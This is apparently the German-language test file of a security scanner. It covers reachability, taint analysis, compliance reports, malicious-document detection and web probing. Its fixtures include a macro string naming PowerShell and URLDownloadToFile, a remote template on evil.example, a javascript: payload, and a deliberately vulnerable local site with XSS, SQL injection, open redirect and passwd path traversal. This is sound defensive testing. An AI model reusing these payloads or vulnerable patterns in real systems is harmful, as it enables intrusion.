    const full = estimateCost({ provider: 'anthropic', model: 'claude-sonnet-5', inputTokens: 1e6, outputTokens: 0 });
    const cached = estimateCost({ provider: 'anthropic', model: 'claude-sonnet-5', inputTokens: 1e6, outputTokens: 0, cachedTokens: 9e5 });
    check('prompt-cache: zwischengespeicherte Tokens kosten nur einen Bruchteil', cached.usd < full.usd * 0.25 && cached.savedUsd > 0);
  }

  // --- Jede Kern-Datei laesst sich laden (faengt Syntaxfehler in Dateien ohne eigenen Test) ---
  {
    const fs = require('fs'); const path = require('path');
    const dirs = ['../src/core', '../src/core/modules'];
    const bad = [];
    for (const d of dirs) for (const f of fs.readdirSync(path.join(__dirname, d)).filter((x) => x.endsWith('.js'))) { try { require(path.join(__dirname, d, f)); } catch (e) { bad.push(`${f}: ${e.message}`); } }
    check('laden: alle Kern-Module ohne Fehler' + (bad.length ? ' – ' + bad.join('; ') : ''), bad.length === 0);
  }

  // --- Erreichbarkeit verwundbarer Pakete und Datenfluesse ueber Dateien ---
  {
    const { applyReachability } = require('../src/core/reach');
    const { analyzeTaint } = require('../src/core/taint');
    const U = (label, content) => ({ label, content, kind: 'file' });
    const units = [
      U('app/package.json', JSON.stringify({ dependencies: { lodash: '4.17.15', minimist: '1.2.0', axios: '0.21.0' } })),
      U('app/src/index.js', "const _ = require('lodash');\nimport axios from 'axios';\n_.merge(a, b);\n"),
    ];
    const dep = (name, extra = {}) => ({ title: `Verwundbare Abhaengigkeit: ${name}`, category: 'Dependencies', severity: 'high', contextualRiskScore: 80, package: { ecosystem: 'npm', name, version: '1' }, reachability: '', ...extra });
    const r = applyReachability([dep('lodash', { vulnSymbols: ['template'] }), dep('minimist'), dep('kind-of'), dep('axios'), dep('lodash', { vulnSymbols: ['merge'] })], units);
    check('erreichbar: Paket genutzt, betroffene Funktion nicht → heruntergestuft', r[0].reach === 'function-unused' && r[0].severity === 'medium' && r[0].contextualRiskScore === 40);
    check('erreichbar: direkte Abhängigkeit ohne Import → ungenutzt', r[1].reach === 'unused' && r[1].severity === 'medium');
    check('erreichbar: nur indirekt enthalten', r[2].reach === 'transitive' && r[2].severity === 'high');
    check('erreichbar: genutzt bleibt hoch, betroffene Funktion aufgerufen → sicher', r[3].reach === 'used' && r[3].severity === 'high' && r[4].reach === 'function-used' && r[4].confidence === 'high');
    check('erreichbar: aktiv ausgenutzte Lücke wird nie abgewertet', applyReachability([dep('minimist', { inCisaKev: true })], units)[0].severity === 'high');
    const flow = analyzeTaint([
      U('srv/db.js', 'function findUser(id) {\n  return db.query("SELECT * FROM users WHERE id = " + id);\n}\nmodule.exports = { findUser };'),
      U('srv/service.js', 'function loadProfile(userId) {\n  return findUser(userId);\n}'),
      U('srv/routes.js', "app.get('/u', (req, res) => {\n  loadProfile(req.query.id);\n});"),
    ]);
    check('datenfluss: Eingabe über drei Dateien bis in den SQL-Befehl', flow.length === 1 && flow[0].ruleId === 'taint-sql' && /routes\.js/.test(flow[0].description) && /service\.js:loadProfile/.test(flow[0].description) && flow[0].location === 'srv/db.js:2');
    const safe = analyzeTaint([
      U('srv/db.js', 'function findUser(id) {\n  return db.query("SELECT * FROM users WHERE id = ?", [id]);\n}'),
      U('srv/routes.js', "app.get('/u', (req, res) => { findUser(req.query.id); });"),
    ]);
    check('datenfluss: Platzhalter im SQL → keine Meldung', safe.length === 0);
  }

  // --- Einordnung (CWE/OWASP), Normen-Nachweise, Kurzbericht ---
  {
    const { applyTaxonomy, complianceReport } = require('../src/core/taxonomy');
    const rep = require('../src/core/report');
    const fs0 = [
      { ruleId: 'php-sql-concat', category: 'Injection', severity: 'critical', title: 'Eingabe landet direkt im SQL-Befehl (PHP)', location: 'a.php:1', impact: 'Datenbank auslesbar.', steps: ['Prepared Statements verwenden.'] },
      { ruleId: 'CVE-2022-23529', category: 'Dependencies', severity: 'high', title: 'Verwundbare Abhaengigkeit: jsonwebtoken', location: 'npm' },
      { ruleId: 'missing-hsts', category: 'Transport', severity: 'low', title: 'HSTS fehlt', location: 'https://x' },
    ];
    const t = applyTaxonomy(fs0);
    check('einordnung: SQL → CWE-89 / OWASP A03, Paket → A06, HSTS → A02', t[0].cwe === 'CWE-89' && t[0].owasp === 'A03' && t[1].owasp === 'A06' && t[2].owasp === 'A02');
    const comp = complianceReport(t);
    const iso = comp.find((c) => c.key === 'iso27001');
    check('normen: ISO A.8.28 dringend, A.8.8 offen, Lizenz-Kontrolle grün', iso.controls.find((c) => c.id === 'A.8.28').status === 'fail' && iso.controls.find((c) => c.id === 'A.8.8').status === 'fail' && iso.controls.find((c) => c.id === 'A.5.32').status === 'ok');
    check('normen: vier Kataloge (ISO 27001, BSI, NIS2, DSGVO)', comp.map((c) => c.key).join() === 'iso27001,bsi,nis2,dsgvo');
    const html = rep.toHtml({ findings: t, summary: { total: 3, counts: { critical: 1, high: 1, medium: 0, low: 1, info: 0 } }, meta: {}, errors: [] });
    check('bericht: CWE, OWASP und Normen-Kapitel enthalten', /CWE-89/.test(html) && /A03:2021/.test(html) && /Nachweise für Normen/.test(html));
    const ex = rep.toExecutive({ findings: t, meta: { at: '2026-11-02T10:00:00Z' } }, { company: 'Muster GmbH', logoDataUrl: 'data:image/png;base64,AAAA', trend: [{ open: 9 }, { open: 5 }, { open: 3 }] });
    check('kurzbericht: Firma, Logo, Note, Risiken, Schritte, Verlauf', /Muster GmbH/.test(ex) && /<img src="data:image\/png/.test(ex) && /Sicherheitswert/.test(ex) && /Prepared Statements/.test(ex) && /<polyline/.test(ex));
    check('kurzbericht: fremdes Logo-Format wird nicht eingebettet', !/<img/.test(rep.toExecutive({ findings: [] }, { logoDataUrl: 'javascript:alert(1)' })));
    const sarif = JSON.parse(rep.toSarif({ findings: t }));
    check('sarif: CWE- und OWASP-Tags', sarif.runs[0].results[0].properties.tags.includes('CWE-89') && sarif.runs[0].results[0].properties.tags.includes('OWASP-A03'));
  }

  // --- Trefferquote am Uebungsprojekt (nur Regeln) darf nicht sinken ---
  {
    const path = require('path');
    const { ingestTargets } = require('../src/core/ingest');
    const { runStaticModules } = require('../src/core/modules/static');
    const { scoreBench } = require('../src/core/bench');
    const exp = require('../bench/expected.json');
    const ing = await ingestTargets([{ type: 'path', value: path.join(__dirname, '..', 'bench', exp.project) }]);
    const pre = prescan(ing.units, {});
    const s = scoreBench(dedupeFindings([...pre.findings, ...runStaticModules(ing.units).findings]), exp);
    check(`bench: Regeln finden ${s.found}/${s.total}, Genauigkeit ${Math.round(s.precision * 100)} %`, s.recall >= 0.95 && s.precision >= 0.85);
  }

  // --- Schadsoftware, Dokumente, Webseiten-Durchgang, Proben, Login ---
  {
    const fs = require('fs'); const os = require('os'); const path = require('path');
    const AdmZip = require('adm-zip');
    const { analyzeDocument } = require('../src/core/docaudit');
    const { parseDefender, parseSignatures, hashLookup } = require('../src/core/malware');
    const z = new AdmZip(); z.addFile('word/document.xml', Buffer.from('<w:document/>')); z.addFile('word/vbaProject.bin', Buffer.from('Attribute VB_Name AutoOpen Shell powershell URLDownloadToFile'));
    const docm = analyzeDocument(z.toBuffer(), 'rechnung.docx');
    check('dokument: Makro mit verdächtigen Befehlen, getarnte Endung', docm.some((f) => f.ruleId === 'doc-macro-suspicious' && f.severity === 'high') && docm.some((f) => f.ruleId === 'doc-macro-wrong-extension'));
    const z2 = new AdmZip(); z2.addFile('word/document.xml', Buffer.from('<w:document/>')); z2.addFile('word/_rels/settings.xml.rels', Buffer.from('<Relationship Type="http://x/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>'));
    check('dokument: Vorlage aus dem Internet erkannt', analyzeDocument(z2.toBuffer(), 'a.docx').some((f) => f.ruleId === 'doc-remote-template'));
    const pdf = Buffer.from('%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >> endobj 2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj');
    check('dokument: PDF mit JavaScript beim Öffnen', analyzeDocument(pdf, 'x.pdf').some((f) => f.ruleId === 'pdf-active-suspicious'));
    check('dokument: harmloses PDF ohne Befund', analyzeDocument(Buffer.from('%PDF-1.7\n1 0 obj << /Type /Page >> endobj'), 'ok.pdf').length === 0);
    const dout = 'Scan starting...\r\nScan finished.\r\nScanning C:\\x found 1 threats.\r\n\r\nThreat                  : Trojan:Win32/Wacatac.B!ml\r\nResources               : 1 total\r\n    file                : C:\\x\\setup.exe\r\n';
    const th = parseDefender(dout);
    check('defender: Bedrohung und Datei aus der Ausgabe gelesen', th.length === 1 && th[0].name === 'Trojan:Win32/Wacatac.B!ml' && /setup\.exe$/.test(th[0].file));
    const sig = parseSignatures([{ p: 'C:\\x\\a.exe', s: 'HashMismatch', n: 'CN=Firma' }, { p: 'C:\\x\\b.exe', s: 'NotSigned' }, { p: 'C:\\x\\c.dll', s: 'Valid' }], 'C:\\x');
    check('signatur: manipuliert = kritisch, unsigniert gesammelt, gültig still', sig.some((f) => f.ruleId === 'binary-signature-tampered' && f.severity === 'critical') && sig.some((f) => f.ruleId === 'binary-unsigned') && sig.length === 2);
    const tmpExe = path.join(os.tmpdir(), `vigil-test-${Date.now()}.exe`); fs.writeFileSync(tmpExe, 'MZ test');
    const hl = await hashLookup([{ file: tmpExe, size: 7 }], os.tmpdir(), { key: 'k', fetchImpl: async (u, o) => ({ json: async () => (/query=get_info&hash=[0-9a-f]{64}$/.test(o.body) && o.headers['Auth-Key'] === 'k' ? { query_status: 'ok', data: [{ signature: 'AgentTesla' }] } : { query_status: 'no_results' }) }) });
    fs.unlinkSync(tmpExe);
    check('malwarebazaar: nur Fingerabdruck gesendet, Treffer gemeldet', hl.findings.length === 1 && /AgentTesla/.test(hl.findings[0].title));
    check('malwarebazaar: ohne Schlüssel übersprungen', /übersprungen/.test((await hashLookup([{ file: 'x', size: 1 }], '.', {})).notes[0]));

    // Absichtlich unsichere Test-Webseite
    const http = require('http');
    const sessions = new Map();
    const site = http.createServer((req, res) => {
      const u = new URL(req.url, 'http://x');
      const sid = ((req.headers.cookie || '').match(/sid=(\w+)/) || [])[1];
      const html = (b, h = {}) => { res.writeHead(200, { 'Content-Type': 'text/html', ...h }); res.end(`<html><body>${b}</body></html>`); };
      let body = ''; req.on('data', (d) => { body += d; }); req.on('end', () => {
        if (u.pathname === '/') return html('<a href="/search?q=hallo">Suche</a> <a href="/item?id=1">Artikel</a> <a href="/go?next=/">Weiter</a> <a href="/view?file=a.txt">Datei</a> <a href="/login">Login</a> <form method="post" action="/newsletter"><input name="mail"><input type="password" name="pw"></form>');
        if (u.pathname === '/search') return html(`Ergebnisse für ${u.searchParams.get('q')}`);
        if (u.pathname === '/item') return /'/.test(u.searchParams.get('id')) ? html('Fehler: You have an error in your SQL syntax near') : html('Artikel 1');
        if (u.pathname === '/go') { res.writeHead(302, { Location: u.searchParams.get('next') }); return res.end(); }
        if (u.pathname === '/view') return /passwd/.test(u.searchParams.get('file')) ? html('root:x:0:0:root:/root:/bin/bash') : html('Datei-Inhalt');
        if (u.pathname === '/login' && req.method === 'GET') { const id = sid || Math.random().toString(36).slice(2, 10); if (!sessions.has(id)) sessions.set(id, null); return html('<form method="post" action="/login"><input name="email"><input type="password" name="password"></form>', sid ? {} : { 'Set-Cookie': `sid=${id}; Path=/` }); }
        if (u.pathname === '/login' && req.method === 'POST') {
          const p = new URLSearchParams(body);
          if (p.get('email') === 'test@example.org' && p.get('password') === 'Geheim1') { sessions.set(sid, 'test'); res.writeHead(302, { Location: '/konto' }); return res.end(); }
          return html(p.get('email') === 'test@example.org' ? 'Falsches Passwort.' : 'Dieses Konto gibt es nicht, bitte registrieren Sie sich zuerst.');
        }
        if (u.pathname === '/konto') return sessions.get(sid) ? html('Willkommen im Konto <a href="/profil?tab=1">Profil</a> <a href="/logout">Abmelden</a> <form method="post" action="/email"><input name="email"></form>') : html('<form><input type="password" name="password"></form>');
        if (u.pathname === '/profil') return sessions.get(sid) ? html(`Profil ${u.searchParams.get('tab')}`) : html('<input type="password">');
        if (u.pathname === '/logout') { res.writeHead(302, { Location: '/', 'Set-Cookie': 'sid=; Max-Age=0' }); return res.end(); }
        res.writeHead(404); res.end('nein');
      });
    });
    await new Promise((r) => site.listen(0, '127.0.0.1', r));
    const baseUrl = `http://127.0.0.1:${site.address().port}/`;
    const { runDeepWeb } = require('../src/core/modules/webdeep');
    const shallow = await runDeepWeb(baseUrl, { deep: false, rps: 200 });
    check('web: Durchgang findet Passwort über HTTP; ohne Nachweis keine Proben', shallow.findings.some((f) => f.ruleId === 'form-password-http') && !shallow.findings.some((f) => /^probe-/.test(f.ruleId)) && /nur für nachgewiesene/.test(shallow.notes.join(' ')));
    const deepRun = await runDeepWeb(baseUrl, { deep: true, rps: 200, login: { loginUrl: baseUrl + 'login', username: 'test@example.org', password: 'Geheim1' } });
    const ids = deepRun.findings.map((f) => f.ruleId);
    check('proben: XSS, SQL-Fehler, offene Weiterleitung, Path Traversal', ['probe-xss-reflected', 'probe-sql-error', 'probe-open-redirect', 'probe-path-traversal'].every((x) => ids.includes(x)));
    check('login: Session Fixation, Cookie-Schutz, Konto-Verrat, Abmelden', /erfolgreich/.test(deepRun.notes.join(' ')) && ['login-session-fixation', 'login-session-cookie-flags', 'login-user-enumeration', 'login-logout-not-invalidated'].every((x) => ids.includes(x)));
    check('login: angemeldeter Bereich – Formular ohne CSRF-Schutz', deepRun.findings.some((f) => f.ruleId === 'form-no-csrf' && /angemeldeten/.test(f.title)));
    const bad = await runDeepWeb(baseUrl, { deep: true, rps: 200, login: { loginUrl: baseUrl + 'login', username: 'test@example.org', password: 'falsch' } });
    check('login: falsches Testpasswort wird gemeldet, nicht als Befund', /nicht geklappt/.test(bad.notes.join(' ')) && !bad.findings.some((f) => f.ruleId === 'login-session-fixation'));
    if (ids.length < 9) console.log('    Hinweise:', deepRun.notes.join(' | '), '| IDs:', ids.join(','));
    site.close();
  }

  // --- Uebersicht: Befunde, Ziele und Laeufe loeschen ---
  {
    const st = require('../src/core/store');
    const db = st.emptyStore();
    const tg = [{ type: 'path', value: 'C:/a' }];
    const tg2 = [{ type: 'path', value: 'C:/b' }];
    const r1 = st.applyRun(db, { targets: tg, findings: [{ ruleId: 'x1', title: 'A', location: 'a/1.js:1', category: 'Other', severity: 'high', source: 'prescan' }, { ruleId: 'x2', title: 'B', location: 'a/2.js:1', category: 'Other', severity: 'low', source: 'prescan' }], scannersRun: [] });
    st.applyRun(db, { targets: tg2, findings: [{ ruleId: 'y', title: 'C', location: 'b/1.js:1', category: 'Other', severity: 'low', source: 'prescan' }], scannersRun: [] });
    st.addRun(db, { id: 'run-aaaaaaaa', status: 'COMPLETED', targets: tg, targetIds: [st.targetIdOf(tg[0])] });
    const d = st.deleteFindings(db, [r1.findings[0].id, 'gibt-es-nicht']);
    check('löschen: einzelner Befund entfernt, unbekannte ID ignoriert', d.deleted === 1 && Object.keys(db.findings).length === 2);
    const t = st.deleteTarget(db, st.targetIdOf(tg[0]));
    check('löschen: Ziel mit seinen Befunden, andere bleiben', t.ok && t.deletedFindings === 1 && Object.keys(db.findings).length === 1 && !db.targets[st.targetIdOf(tg[0])] && !!db.targets[st.targetIdOf(tg2[0])]);
    st.addRun(db, { id: 'run-bbbbbbbb', status: 'RUNNING', targets: [] });
    check('löschen: Lauf entfernt, laufender Lauf geschützt', st.deleteRun(db, 'run-aaaaaaaa').ok && !db.runs.some((r) => r.id === 'run-aaaaaaaa') && !st.deleteRun(db, 'run-bbbbbbbb').ok);
    const rid = Object.keys(db.findings)[0];
    st.setStatus(db, rid, 'RESOLVED');
    check('aufräumen: behobene Befunde löschen', st.purgeResolved(db).deleted === 1 && Object.keys(db.findings).length === 0);
  }

  // --- Tagesaktuelle Erkennungsdaten (Feeds) ---
  {
    const fs = require('fs'); const os = require('os'); const path = require('path');
    const feeds = require('../src/core/feeds');
    const fscan = require('../src/core/feedscan');
    const toml = ['title = "gitleaks"', ...Array.from({ length: 60 }, (_, i) => `[[rules]]\nid = "demo-${i}"\ndescription = "Demo Token ${i}"\nregex = '''(?i)\\b(demo${i}_[a-z0-9]{20})\\b'''\nkeywords = ["demo${i}_"]\n`), '[[rules]]\nid = "github-pat"\ndescription = "GitHub Personal Access Token"\nregex = \'\'\'ghp_[0-9a-zA-Z]{36}\'\'\'\nkeywords = ["ghp_"]\n[[rules.allowlists]]\nregexes = [\'\'\'x\'\'\']'].join('\n');
    const repo = Object.fromEntries(Array.from({ length: 25 }, (_, i) => [`lib${i}`, { vulnerabilities: [{ below: '2.0.0', severity: 'high', identifiers: { CVE: [`CVE-2020-000${i}`], summary: 'XSS' } }], extractors: { filename: [`lib${i}-(§§version§§)(.min)?\\.js`], filecontent: [`/\\*! lib${i} v(§§version§§)`] } }]));
    const fake = (bodies) => async (url) => { const b = bodies[url]; if (b instanceof Error) throw b; return { ok: b !== undefined, status: b === undefined ? 404 : 200, arrayBuffer: async () => Buffer.from(b) }; };
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-feeds-'));
    const urls = { [feeds.FEEDS[0].urls[0]]: toml, [feeds.FEEDS[1].urls[0]]: JSON.stringify(repo) };
    const r1 = await feeds.syncFeeds(dir, { fetchImpl: fake(urls) });
    check('feeds: beide Quellen geladen und geprüft', r1.every((x) => x.ok) && r1[0].count === 61 && r1[1].count === 25);
    const r2 = await feeds.syncFeeds(dir, { fetchImpl: fake({}) });
    check('feeds: frische Daten werden nicht erneut geladen', r2.every((x) => x.skipped));
    const r3 = await feeds.syncFeeds(dir, { force: true, fetchImpl: fake({ [feeds.FEEDS[0].urls[0]]: 'kaputt', [feeds.FEEDS[1].urls[0]]: new Error('offline'), [feeds.FEEDS[1].urls[1]]: new Error('offline') }) });
    const st = feeds.feedStatus(dir);
    check('feeds: fehlerhafte Quelle – letzte gute Fassung bleibt aktiv', r3.every((x) => !x.ok) && st[0].count === 61 && /Format unerwartet/.test(st[0].lastError) && st[1].count === 25);
    check('feeds: nur erlaubte HTTPS-Quellen', feeds.FEEDS.every((f) => f.urls.every((u) => u.startsWith('https://raw.githubusercontent.com/'))));
    const c = feeds.loadCompiled(dir);
    check('feeds: Go-Regex nach JavaScript übersetzt', c.secretRules.length === 61 && c.secretRules[0].re.flags.includes('i') && feeds.goRegexToJs('(?P<k>a)\\z').source === '(?<k>a)$' && feeds.goRegexToJs('\\p{L}+') === null);
    const sec = fscan.scanSecretsWithFeed([{ label: 'p/a.js', content: 'x = "DEMO7_abcdefghij0123456789"\ny = "ghp_' + 'A'.repeat(18) + 'b'.repeat(18) + '"\nz = "demo3_example_example_ex"' }], c.secretRules);
    check('feeds: Zugangsdaten mit neuen Regeln gefunden, Beispielwerte ignoriert', sec.length === 2 && sec.some((f) => f.ruleId === 'gl-demo-7' && f.location === 'p/a.js:1') && sec.some((f) => f.ruleId === 'gl-github-pat' && f.severity === 'critical'));
    const libs = fscan.scanJsLibs([{ label: 'p/vendor/lib4-1.9.2.min.js', content: '' }, { label: 'p/x.js', content: '/*! lib5 v2.1.0 */' }], c.retire);
    check('feeds: verwundbare Bibliothek per Dateiname, aktuelle Version still', libs.length === 1 && /lib4 1\.9\.2 \(CVE-2020-0004\)/.test(libs[0].title) && libs[0].package.fixed === '2.0.0');
    check('feeds: Skripte einer Webseite geprüft', fscan.scanScriptUris(['https://cdn.example/lib9-1.0.0.js'], c.retire, 'https://x').length === 1);
    check('feeds: Versionsvergleich', fscan.cmpVer('1.10.0', '1.9.9') > 0 && fscan.cmpVer('2.0.0-beta', '2.0.0') < 0 && fscan.cmpVer('3.4.1', '3.4.1') === 0);
    fs.rmSync(dir, { recursive: true, force: true });
  }

  // --- Korrekturen aus der Code-Pruefung ---
  {
    const AdmZip = require('adm-zip');
    const http = require('http');
    const { analyzeDocument } = require('../src/core/docaudit');
    const { runDeepWeb } = require('../src/core/modules/webdeep');
    const z = new AdmZip(); z.addFile('word/document.xml', Buffer.from('<w:document/>'));
    z.addFile('word/_rels/document.xml.rels', Buffer.from('<Relationships><Relationship Id="r1" Type="http://x/hyperlink" Target="https://example.org/" TargetMode="External"/><Relationship Id="r2" Type="http://x/oleObject" Target="embeddings/oleObject1.bin"/></Relationships>'));
    check('dokument: Link plus lokales Objekt ist kein Nachladen', !analyzeDocument(z.toBuffer(), 'a.docx').some((f) => f.ruleId === 'doc-remote-template'));
    check('dokument: leere oder winzige Datei wirft keinen Fehler', analyzeDocument(Buffer.alloc(2), 'leer.doc').length === 0 && analyzeDocument(Buffer.alloc(0), 'leer.pdf').length === 0);
    // Anmeldeformular, das an einen fremden Host sendet
    const site = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(req.url.startsWith('/login') ? '<form method="post" action="https://idp.example.invalid/auth"><input name="email"><input type="password" name="password"></form>' : '<a href="/login">Login</a>');
    });
    await new Promise((r) => site.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${site.address().port}/`;
    const off = await runDeepWeb(base, { deep: true, rps: 200, login: { loginUrl: base + 'login', username: 'a@b.c', password: 'x' } });
    check('login: Testkonto geht nie an einen fremden Host', /anderen Host/.test(off.notes.join(' ')) && !off.ran.includes('web-login'));
    site.close();
    const down = await runDeepWeb('http://127.0.0.1:9/', { deep: true, rps: 200 });
    check('web: nicht erreichbare Seite gilt nicht als geprüft (keine falsche Behebung)', !down.ran.includes('web-crawl') && !down.ran.includes('web-probe') && /nicht erreichbar/.test(down.notes.join(' ')));
    const { toHtml } = require('../src/core/reportdoc');
    const html = toHtml({ findings: [{ title: 'Behobenes Problem', severity: 'critical', status: 'RESOLVED', category: 'Other', location: 'x' }, { title: 'Offenes Problem', severity: 'low', status: 'OPEN', category: 'Other', location: 'y' }], meta: {} });
    check('bericht: behobene Befunde zählen nicht als offen', !html.includes('Behobenes Problem') && html.includes('Offenes Problem'));
  }

  console.log(`\n${pass} ok, ${fail} fehlgeschlagen`);
  process.exit(fail ? 1 : 0);
})();
